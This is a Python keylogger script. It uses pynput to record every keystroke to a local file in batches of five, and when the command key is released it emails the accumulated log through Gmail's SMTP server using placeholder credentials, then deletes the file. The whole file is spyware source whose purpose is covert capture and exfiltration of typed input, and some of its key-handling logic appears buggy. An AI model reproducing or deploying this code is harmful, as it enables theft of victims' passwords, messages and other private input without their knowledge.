from pynput.keyboard import Listener, Key
import os
import smtplib, ssl


keys = []
count = 0


def on_press(Key):
    global count, keys
    keys.append(Key)
    count += 1
    if count >= 5:
        count = 0
        write_files(keys)
        keys = []


def write_files(keys):
    with open('keys.txt', 'a') as fs:
        fs.write('five keys[')
        for i in keys:
            key = str(i).lstrip('Key.').rstrip('.key')
            fs.write(f' {key} ')
        fs.write(']')


def on_release(Key):
    if Key == Key.esc:
        return False
    elif Key == Key.cmd and len(keys) != 0:
        with open('keys.txt', 'r') as fs:
            log = fs.read()
            email= 'email'
            password= 'password'
            port=465
            context= ssl.create_default_context()
            try:
                with smtplib.SMTP_SSL('smtp.gmail.com',port, context=context) as server:
                    print('here now')
                    server.login(email,password)
                    server.sendmail(email,email, log)
                    if os.path.exists('keys.txt'):
                         os.remove('keys.txt')
                    else:
                        return
            except Exception as e:
                return


if __name__ == '__main__':
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()








